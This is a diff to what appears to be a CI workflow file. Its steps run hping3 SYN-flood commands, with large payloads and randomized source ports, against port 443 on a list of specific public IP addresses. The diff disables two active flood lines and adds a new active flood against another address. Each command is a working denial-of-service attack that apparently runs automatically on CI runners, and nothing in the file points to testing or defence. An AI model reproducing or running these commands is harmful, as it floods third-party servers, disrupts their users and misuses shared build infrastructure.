@@ -34,13 +34,13 @@ jobs:
           date "+%Y-%m-%d %H:%M:%S"
           # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 47.76.85.88 || true
           # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 47.243.69.11 || true
-          sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 47.83.0.155 || true
-          sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 47.242.104.184 || true
+          # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 47.83.0.155 || true
+          # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 47.242.104.184 || true
 
           # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 139.224.71.209 || true
           # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 106.14.219.131 || true
           # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 8.153.68.92 || true
-          # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 8.153.77.124 || true
+          sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 180.163.145.48 || true
 
           # fz
           # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 125.77.20.72 || true
